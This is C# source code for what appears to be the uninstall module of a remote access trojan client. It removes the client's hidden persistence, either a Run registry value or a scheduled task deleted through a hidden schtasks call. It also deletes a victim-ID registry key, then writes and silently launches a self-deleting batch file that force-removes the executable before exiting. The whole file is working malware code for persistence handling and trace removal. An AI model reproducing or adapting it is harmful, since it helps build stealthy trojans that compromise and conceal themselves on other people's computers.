﻿using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Plugin.Handler
{
    public class HandleUninstall
    {
        public HandleUninstall()
        {
            if (Convert.ToBoolean(Plugin.Install))
                try
                {
                    if (!Methods.IsAdmin())
                        Registry.CurrentUser
                            .CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                                RegistryKeyPermissionCheck.ReadWriteSubTree).DeleteValue(
                                Path.GetFileNameWithoutExtension(Process.GetCurrentProcess().MainModule.FileName));
                    else
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = "schtasks",
                            Arguments = "/delete /f /tn " + @"""'" +
                                        Path.GetFileNameWithoutExtension(
                                            Process.GetCurrentProcess().MainModule.FileName) + @"""'",
                            CreateNoWindow = true,
                            ErrorDialog = false,
                            UseShellExecute = false,
                            WindowStyle = ProcessWindowStyle.Hidden
                        });
                }
                catch (Exception ex)
                {
                    Packet.Error(ex.Message);
                }

            try
            {
                Registry.CurrentUser.CreateSubKey(@"", RegistryKeyPermissionCheck.ReadWriteSubTree)
                    .DeleteSubKey(Connection.Hwid);
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }

            try
            {
                var batch = Path.GetTempFileName() + ".bat";
                using (var sw = new StreamWriter(batch))
                {
                    sw.WriteLine("@echo off");
                    sw.WriteLine("timeout 3 > NUL");
                    sw.WriteLine("CD " + Application.StartupPath);
                    sw.WriteLine("DEL " + "\"" + Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName) +
                                 "\"" + " /f /q");
                    sw.WriteLine("CD " + Path.GetTempPath());
                    sw.WriteLine("DEL " + "\"" + Path.GetFileName(batch) + "\"" + " /f /q");
                }

                Process.Start(new ProcessStartInfo
                {
                    FileName = batch,
                    CreateNoWindow = true,
                    ErrorDialog = false,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }

            Methods.ClientExit();
            Environment.Exit(0);
        }
    }
}